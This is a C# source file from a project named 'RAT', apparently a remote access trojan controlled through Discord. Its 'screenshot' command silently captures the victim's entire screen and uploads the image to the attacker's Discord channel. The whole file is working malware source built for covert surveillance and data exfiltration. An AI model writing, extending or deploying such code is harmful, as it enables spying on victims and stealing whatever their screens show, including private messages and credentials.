using Discord.Commands;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RAT.Commands
{
    public class ScreenshotCommand : ModuleBase<SocketCommandContext>
    {
        [Command("screenshot")]
        public async Task ScreenshotCmd()
        {
            var bounds = Screen.GetBounds(Point.Empty);
            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save("screenshot.png", ImageFormat.Png);
                await Context.Channel.SendFileAsync("screenshot.png");
            }
        }
    }
}
